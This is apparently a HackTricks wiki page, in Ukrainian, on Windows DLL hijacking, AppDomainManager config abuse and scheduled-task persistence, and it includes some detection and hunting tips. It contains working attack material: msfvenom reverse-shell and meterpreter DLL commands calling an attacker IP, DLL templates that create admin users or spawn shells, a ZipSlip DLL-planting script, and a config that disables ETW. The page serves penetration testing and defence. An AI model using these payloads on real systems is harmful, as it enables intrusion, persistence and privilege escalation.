# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking полягає в тому, щоб змусити довірену програму завантажити шкідливу DLL. Цей термін охоплює кілька тактик, як-от **DLL Spoofing, Injection і Side-Loading**. Його переважно використовують для виконання коду та забезпечення persistence, а рідше — для підвищення привілеїв. Хоча тут основна увага приділяється підвищенню привілеїв, метод hijacking залишається однаковим для різних цілей.

### Поширені техніки

Для DLL hijacking застосовують кілька методів, ефективність кожного з яких залежить від стратегії завантаження DLL програмою:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: заміна справжньої DLL шкідливою, за потреби з використанням DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: розміщення шкідливої DLL у шляху пошуку, що має пріоритет перед шляхом до легітимної DLL, з використанням шаблону пошуку програми.
3. **Phantom DLL Hijacking**: створення шкідливої DLL, яку програма завантажить, вважаючи її неіснуючою обов’язковою DLL.
4. **DLL Redirection**: зміна параметрів пошуку, як-от `%PATH%`, або файлів `.exe.manifest` / `.exe.local`, щоб спрямувати програму до шкідливої DLL.
5. **WinSxS DLL Replacement**: заміна легітимної DLL шкідливою копією в каталозі WinSxS; цей метод часто пов’язаний із DLL side-loading.
6. **Relative Path DLL Hijacking**: розміщення шкідливої DLL у контрольованому користувачем каталозі разом із копією програми, що нагадує техніки Binary Proxy Execution.

Програма також може реалізовувати **власний завантажувач DLL**. Привілейований процес може перераховувати вміст дочірнього каталогу, наприклад `Libraries` або `Plugins`, і передавати вибрану DLL допоміжному компоненту, незалежно від стандартного порядку пошуку DLL у Windows. Якщо інший обліковий запис може створювати файли саме в цьому каталозі, розглядайте це як напрямок для перевірки: встановіть ідентичність процесу, ефективні ACL каталогу, правило вибору файлів і наявність доступного шляху до завантаження. Сам факт, що каталог поруч із виконуваним файлом доступний для запису, не доводить, що процес завантажує DLL саме з нього.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Класичний DLL sideloading — не єдиний спосіб змусити довірений процес **.NET Framework** завантажити код зловмисника. Якщо цільовий виконуваний файл є **керованою** програмою, CLR також перевіряє файл конфігурації програми, названий за іменем виконуваного файлу (наприклад, `Setup.exe.config`). У цьому файлі можна вказати власний **AppDomainManager**. Якщо конфігурація посилається на контрольовану зловмисником збірку, розміщену поруч із EXE, CLR завантажує її **до звичайного шляху виконання коду програми** та запускає в довіреному процесі.<sup>[[24]](#references)</sup>

Згідно зі схемою конфігурації .NET Framework від Microsoft, для використання власного менеджера мають бути вказані обидва параметри — `<appDomainManagerAssembly>` і `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Мінімальна конфігурація:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Мінімальний менеджер:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Практичні примітки:
- Це tradecraft, **специфічний для .NET Framework**. Він залежить від розбору конфігурації CLR, а не від порядку пошуку DLL у Win32.
- Хост має бути справжнім **керованим EXE**. Швидка перевірка: `sigcheck -m target.exe`, `corflags target.exe` або пошук **CLR Runtime Header** у метаданих PE.
- Ім’я файлу конфігурації має точно збігатися з ім’ям виконуваного файлу (`<binary>.config`); зазвичай він розташований **поруч із EXE**.
- Це корисно з **підписаними бінарними файлами Microsoft/постачальника**, оскільки довірений EXE залишається незмінним, а шкідлива керована збірка виконується в тому самому процесі.
- Якщо у вас уже є доступний для запису каталог інсталятора/оновлення, AppDomainManager hijacking можна використати як **перший етап**, а потім застосувати класичний DLL sideloading або reflective loading на наступних етапах.

### AppDomainManager як завантажувач і основа для scheduled task

Практичний сценарій вторгнення — поєднати довірений керований EXE зі шкідливими `*.config` і DLL AppDomainManager, яка працює лише як **невеликий bootstrapper**:<sup>[[25]](#references)</sup>

1. Користувач запускає підписаний інсталятор або засіб оновлення .NET із правдоподібного розташування, наприклад `%USERPROFILE%\Downloads`.
2. Сусідній файл конфігурації змушує CLR завантажити збірку зловмисника **до запуску логіки легітимного застосунку**.
3. Шкідливий менеджер виконує **path gate** (наприклад, продовжує роботу, лише якщо хост EXE запущено з `Downloads`, і дозволяє запуск другого етапу лише з `%LOCALAPPDATA%`).
4. Якщо перевірка проходить, він завантажує справжнє корисне навантаження до доступного для запису користувачем шляху, наприклад `%LOCALAPPDATA%\PerfWatson2.exe`, і встановлює механізм закріплення через scheduled task.

Чому цей варіант важливий:
- Підписаний хост EXE залишається незмінним, тож перевірка, яка хешує лише основний бінарний файл, може не виявити компрометацію.
- Простий **path-based anti-analysis** трапляється часто: переміщення тріади ZIP/EXE/DLL на Desktop, у Temp або до шляху sandbox може навмисно перервати ланцюжок.
- DLL AppDomainManager першого етапу може залишатися невеликою та малопомітною, поки справжній implant завантажується пізніше.

Мінімальний приклад механізму закріплення, який часто трапляється в цьому сценарії:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Примітки:
- ` /rl highest` означає **найвищий доступний рівень** для цього користувача/сеансу; сам по собі він не гарантує підвищення привілеїв до SYSTEM.
- Цю техніку часто точніше класифікувати як **виконання/закріплення через зловживання конфігурацією .NET**, а не як класичний hijacking порядку пошуку відсутньої DLL, хоча оператори часто поєднують обидва прийоми.

Орієнтири для виявлення:
- Підписані .NET-виконувані файли, запущені з **каталогів розпакування ZIP**, `Downloads`, `%TEMP%` або інших папок, доступних для запису користувачам, поруч із якими міститься `<exe>.config`.
- Нові заплановані завдання, дія яких вказує на `%LOCALAPPDATA%`, `%APPDATA%` або `Downloads`, а їхні назви імітують засоби оновлення браузерів/виробників.
- Короткочасні керовані процеси-завантажувачі, які відразу завантажують інший EXE, а потім запускають `schtasks.exe`.
- Зразки, які завершують роботу, якщо шлях до виконуваного файлу не відповідає очікуваному каталогу профілю користувача.

### Hijacking наявного запланованого завдання для повторного запуску ланцюжка sideload

Для закріплення не варто шукати лише **створення нового завдання**. Деякі групи зловмисників чекають, поки легітимний інсталятор створить **звичайне завдання оновлення**, а потім **переписують дію завдання**, щоб його наявні назва, автор і тригер залишалися знайомими для захисників.

Повторно використовуваний робочий процес:
1. Установіть/запустіть легітимне програмне забезпечення та визначте завдання, яке воно зазвичай створює.
2. Експортуйте XML завдання та зафіксуйте поточні значення `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Замініть лише дію, щоб завдання запускало ваш **довірений EXE-хост** із проміжного каталогу, доступного для запису користувачам; далі він завантажить справжній payload через side-load або AppDomain.
4. Зареєструйте завдання з тією самою назвою, а не створюйте новий очевидний артефакт закріплення.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Чому це непомітніше:
- Назва завдання все ще може виглядати легітимно (наприклад, як назва засобу оновлення від постачальника).
- Його запускає служба **Task Scheduler**, тому під час перевірки батьківського процесу або ланцюжка предків часто виявляється очікуваний ланцюжок планувальника, а не `explorer.exe`.
- Команди DFIR, які шукають лише **нові назви завдань**, можуть не помітити завдання, реєстрація якого вже існувала, але дія тепер вказує на `%LOCALAPPDATA%`, `%APPDATA%` або інший шлях, контрольований зловмисником.

Швидкі точки для пошуку:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Порівнюйте XML-файли `C:\Windows\System32\Tasks\*` і метадані `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` з базовим зразком.
- Створюйте сповіщення, коли завдання засобу оновлення, **схоже на завдання постачальника**, запускається з **каталогів, доступних для запису користувачеві**, або запускає .NET EXE з файлом `*.config` у тому самому каталозі.

> [!TIP]
> Щоб ознайомитися з покроковим ланцюжком, який поєднує HTML staging, конфігурації AES-CTR і .NET-імпланти з DLL sideloading, перегляньте наведений нижче робочий процес.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Пошук відсутніх DLL

Найпоширеніший спосіб знайти відсутні DLL у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із пакета sysinternals і **встановити** **такі 2 фільтри**:

![Common Techniques - Finding missing Dlls: Найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon із пакета sysinternals і встановити такі 2 фільтри](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: Найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon із пакета sysinternals і встановити такі 2 фільтри](<../../../images/image (230).png>)

і показувати лише **File System Activity**:

![Common Techniques - Finding missing Dlls: і показувати лише File System Activity](<../../../images/image (153).png>)

Якщо шукаєте **відсутні DLL загалом**, залиште це працювати протягом кількох **секунд**.\
Якщо шукаєте **відсутню DLL у конкретному виконуваному файлі**, встановіть ще один фільтр, наприклад **"Process Name" "contains" `<exec name>`**, запустіть його й зупиніть запис подій.<sup>[[9]](#references)</sup>

## Експлуатація відсутніх DLL

Щоб підвищити привілеї, шукайте **DLL, яку привілейований процес намагається завантажити** з каталогу, доступного для запису. Таке може статися, якщо ви контролюєте каталог, який перевіряється раніше за каталог із легітимною DLL, або якщо потрібна DLL відсутня, а ви можете записувати в один із каталогів, які перевіряються.

### Порядок пошуку DLL

**У** [**документації Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можна знайти детальну інформацію про завантаження DLL.**

**Програми Windows** шукають DLL у визначених **шляхах пошуку**, дотримуючись певної послідовності. DLL hijacking стається, коли шкідливу DLL стратегічно розміщують в одному з цих каталогів, щоб її завантажили раніше за справжню DLL. Щоб запобігти цьому, програма має використовувати абсолютні шляхи, звертаючись до потрібних їй DLL.

Нижче наведено **порядок пошуку DLL у 32-бітних** системах:

1. Каталог, з якого завантажено програму.
2. Системний каталог. Щоб отримати шлях до цього каталогу, використовуйте функцію [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya).(_C:\Windows\System32_)
3. 16-бітний системний каталог. Функції для отримання шляху до цього каталогу немає, але він перевіряється. (_C:\Windows\System_)
4. Каталог Windows. Щоб отримати шлях до цього каталогу, використовуйте функцію [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya).
   1. (_C:\Windows_)
5. Поточний каталог.
6. Каталоги, перелічені в змінній середовища PATH. Зверніть увагу, що це не охоплює шлях для конкретної програми, указаний у розділі реєстру **App Paths**. Розділ **App Paths** не використовується під час обчислення шляху пошуку DLL.

Це **типовий** порядок пошуку з увімкненим **SafeDllSearchMode**. Якщо його вимкнути, поточний каталог переміститься на друге місце. Щоб вимкнути цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть для нього значення 0 (типово режим увімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликати з параметром **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук почнеться в каталозі виконуваного модуля, який завантажує **LoadLibraryEx**.

Нарешті, DLL можна завантажити за абсолютним шляхом, а не за назвою. У такому разі Windows шукатиме саму DLL лише за вказаним шляхом; залежності, запитані за назвою, і далі шукатимуться у відповідному порядку.

Є й інші способи змінити порядок пошуку, але тут я їх розглядати не буду.

### Поєднання довільного запису файлів із перехопленням відсутньої DLL

**Пов’язана техніка:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Використовуйте фільтри **ProcMon** (`Process Name` = цільовий EXE, `Path` закінчується на `.dll`, `Result` = `NAME NOT FOUND`), щоб зібрати назви DLL, які процес шукає, але не знаходить.<sup>[[14]](#references)</sup>
2. Якщо бінарний файл запускається **за розкладом/як служба**, DLL з однією з цих назв, розміщена в **каталозі програми** (пункт №1 у порядку пошуку), завантажиться під час наступного запуску. В одному випадку зі сканером .NET процес шукав `hostfxr.dll` у `C:\samples\app\` перед тим, як завантажити справжню копію з `C:\Program Files\dotnet\fxr\...`.
3. Створіть DLL із payload (наприклад, reverse shell) і будь-яким експортом: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Якщо ваш примітив — це **довільний запис у стилі ZipSlip**, створіть ZIP, запис якого виходить за межі каталогу розпакування, щоб DLL потрапила в каталог програми:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Доставте архів до папки «Вхідні»/спільної папки, за якою ведеться спостереження; коли заплановане завдання повторно запустить процес, він завантажить шкідливу DLL і виконає ваш код від імені облікового запису служби.

### Примусове завантаження DLL через RTL_USER_PROCESS_PARAMETERS.DllPath

Розширений спосіб детерміновано вплинути на шлях пошуку DLL для нового процесу — задати поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою нативних API ntdll. Якщо вказати тут контрольований зловмисником каталог, цільовий процес, який шукає імпортовану DLL за іменем (без абсолютного шляху та без використання безпечних прапорців завантаження), можна змусити завантажити шкідливу DLL із цього каталогу.

Основна ідея
- Створіть параметри процесу за допомогою RtlCreateProcessParametersEx і вкажіть власний DllPath, що вказує на контрольовану вами папку (наприклад, каталог, де розташований ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли цільовий бінарний файл шукатиме DLL за іменем, завантажувач перевірить цей DllPath під час пошуку. Це дає змогу надійно виконати DLL sideloading, навіть якщо шкідлива DLL розташована не поруч із цільовим EXE.

Примітки й обмеження
- Це впливає на створюваний дочірній процес; цей спосіб відрізняється від SetDllDirectory, який впливає лише на поточний процес.
- Ціль має імпортувати DLL або викликати LoadLibrary для пошуку DLL за іменем (без абсолютного шляху й без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко задані абсолютні шляхи неможливо перехопити. Експортовані переадресовані функції та SxS можуть змінити порядок пошуку.

Мінімальний приклад на C (ntdll, wide strings, спрощена обробка помилок):

<details>
<summary>Повний приклад на C: примусове виконання DLL sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Приклад практичного використання
- Помістіть шкідливий xmllite.dll (що експортує потрібні функції або проксіює виклики до справжньої DLL) у каталог DllPath.
- Запустіть підписаний бінарний файл, який, як відомо, шукає xmllite.dll за назвою, використовуючи описаний вище метод. Завантажувач знаходить імпорт через заданий DllPath і виконує sideloading вашої DLL.

Цю техніку спостерігали в реальних атаках для побудови багатоступеневих ланцюжків sideloading: початковий launcher скидає допоміжну DLL, яка потім запускає підписаний Microsoft бінарний файл, вразливий до hijacking, із власним DllPath, щоб примусово завантажити DLL зловмисника зі staging-каталогу.<sup>[[6]](#references)</sup>


### Hijacking AppDomainManager через `.exe.config`

Для цілей на **.NET Framework** sideloading можна виконати **до `Main()`**, не змінюючи пам’ять, зловживаючи сусіднім файлом **`.exe.config`** програми. Замість того щоб покладатися лише на порядок пошуку Win32 DLL, зловмисник розміщує легітимний .NET EXE поруч зі шкідливим файлом конфігурації та однією чи кількома контрольованими зловмисником збірками.

Як працює ланцюжок:<sup>[[15]](#references)[[22]](#references)</sup>
1. Запускається EXE-файл, і **CLR читає `<exe>.config`**.
2. У конфігурації задаються **`<appDomainManagerAssembly>`** і **`<appDomainManagerType>`**, щоб середовище виконання створило контрольований зловмисником `AppDomainManager`.
3. Шкідливий менеджер отримує можливість виконання **до `Main()`** у довіреному процесі.
4. Ця сама конфігурація може змусити CLR спочатку шукати локальні збірки (наприклад, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) і послабити перевірку середовища виконання та телеметрію без inline-патчів.

Типовий для кампаній шаблон (точна вкладеність може відрізнятися залежно від директиви / версії CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Чим це корисно:
- **`<probing privatePath="."/>`** обмежує пошук збірок каталогом застосунку, перетворюючи його на передбачувану поверхню для sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** передають виконання коду зловмисника під час ініціалізації CLR, до запуску логіки легітимного застосунку.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** може дозволити застосунку з повною довірою завантажувати непідписані або змінені збірки без помилки перевірки strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** запобігає перенаправленню політикою видавця на новіші збірки.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** робить вибір середовища виконання передбачуванішим.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** особливо цікаве, оскільки **CLR вимикає власну видимість через ETW** за допомогою конфігурації, замість того щоб імплант виправляв `EtwEventWrite` у пам’яті.

Операційна схема, помічена в нещодавніх кампаніях:
- Етап 1: розміщуються `setup.exe`, `setup.exe.config` і локальні збірки.
- Етап 2: вони копіюються до правдоподібного каталогу **AppData update**, хост перейменовується, наприклад на `update.exe`, і запускається знову через **заплановане завдання**.
- Етап 3: перевіряється контекст виконання (наприклад, очікуваний батьківський процес `svchost.exe` від Task Scheduler), перш ніж завантажити кінцеву RAT DLL/експорт.

Ідеї для пошуку:
- Підписані або інші легітимні **виконувані файли .NET**, що запускаються з підозрілими файлами **`.config`** поруч у каталогах, доступних для запису користувачам.
- Файли `.config`, що містять **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** або **`etwEnable enabled="false"`**.
- Заплановані завдання, що повторно запускають перейменовані двійкові файли update з **`%LOCALAPPDATA%`** або каталогів застосунку `\bin\update\`.
- Ланцюжки батьківських/дочірніх процесів, де заплановане завдання запускає довірений хост .NET, який одразу завантажує не пов’язані з постачальником збірки зі свого каталогу.

#### Винятки з порядку пошуку dll у документації Windows

У документації Windows описано певні винятки зі стандартного порядку пошуку DLL:

- Якщо виявлено **DLL з такою самою назвою, як у вже завантаженої в пам’ять**, система обходить звичайний пошук. Натомість вона перевіряє перенаправлення та маніфест, а потім за замовчуванням використовує DLL, уже наявну в пам’яті. **У цьому випадку система не шукає DLL**.
- Якщо DLL розпізнано як **відому DLL** для поточної версії Windows, система використовує свою версію цієї відомої DLL разом із будь-якими залежними від неї DLL, **пропускаючи пошук**. У розділі реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** міститься список таких відомих DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони вказані лише за своїми **іменами модулів**, незалежно від того, чи було початкову DLL знайдено за повним шляхом.

### Підвищення привілеїв

**Вимоги**:

- Знайти процес, який працює або працюватиме з **іншими привілеями** (горизонтальне або латеральне переміщення) і якому **бракує DLL**.
- Переконатися, що є **доступ на запис** до будь-якого **каталогу**, у якому шукатиметься **DLL**. Це може бути каталог виконуваного файлу або каталог у системному шляху.

За замовчуванням такі передумови трапляються нечасто: у привілейованих виконуваних файлів зазвичай немає відсутніх залежностей DLL, а звичайні користувачі зазвичай не можуть записувати в каталоги системного шляху пошуку. Проте неправильно налаштовані середовища можуть створювати обидві умови.\
Якщо вимоги виконано, перевірте проєкт [UACME](https://github.com/hfiref0x/UACME). Хоча його основна мета — обхід UAC, він містить PoC для DLL-hijacking у певних версіях Windows, які часто можна адаптувати до знайденого каталогу, доступного для запису.

Зверніть увагу, що **перевірити дозволи на папку** можна так:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Також **перевірте дозволи для всіх папок у PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Також можна перевірити імпорти виконуваного файлу та експорти DLL за допомогою:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Для повного посібника про те, як **зловживати DLL Hijacking для підвищення привілеїв** за наявності дозволів на запис у папку **System Path**, дивіться:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)перевірить, чи маєте ви дозволи на запис у будь-яку папку в системному PATH.\
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості — це функції **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ і _Write-HijackDll._

### Приклад

Якщо ви знайдете сценарій, який можна експлуатувати, для успішної експлуатації однією з найважливіших умов буде **створити DLL, яка експортує щонайменше всі функції, які виконуваний файл імпортуватиме з неї**. Втім, зауважте, що DLL Hijacking може стати в пригоді, щоб [підвищити рівень цілісності з Medium до High **(обійшовши UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з[ **High Integrity до SYSTEM**](../index.html#from-high-integrity-to-system)**.** Приклад того, **як створити дійсну DLL**, можна знайти в цьому дослідженні DLL hijacking, присвяченому DLL hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **наступному розділі** ви знайдете кілька **базових прикладів коду DLL**, які можуть стати в пригоді як **шаблони** або для створення **DLL з експортованими необов’язковими функціями**.

## **Створення та компіляція DLL**

### **Проксіювання DLL**

По суті, **DLL proxy** — це DLL, яка може **виконати ваш шкідливий код під час завантаження**, а також **надавати функції** й **працювати** так, як **очікується**, переспрямовуючи всі виклики до справжньої бібліотеки.

За допомогою інструмента [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) можна вказати виконуваний файл і вибрати бібліотеку для проксіювання, а потім **згенерувати проксі-DLL**; або вказати DLL і **згенерувати проксі-DLL**.

### **Meterpreter**

**Отримання зворотної оболонки (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Отримайте meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Створіть користувача (x86, версії x64 я не знайшов):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Власна

У багатьох випадках DLL, яку ви компілюєте, має **експортувати кожну функцію, імпортовану процесом-жертвою**. Якщо потрібного експорту бракує, бінарний файл не зможе його знайти, і експлойт не спрацює.

<details>
<summary>Шаблон C DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Альтернативна C DLL з точкою входу потоку</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Практичний приклад: перехоплення DLL локалізації Narrator OneCore TTS (спеціальні можливості/ATs)

Windows Narrator.exe досі під час запуску перевіряє передбачуваний DLL-файл локалізації для певної мови, який можна перехопити для довільного виконання коду та закріплення в системі.<sup>[[7]](#references)</sup>

Основні факти
- Шлях перевірки (поточні збірки): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Застарілий шлях (старіші збірки): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо за шляхом OneCore є доступна для запису DLL під контролем зловмисника, її буде завантажено, а `DllMain(DLL_PROCESS_ATTACH)` виконається. Експорти не потрібні.

Виявлення за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` і `Operation is Load Image` або `CreateFile`.
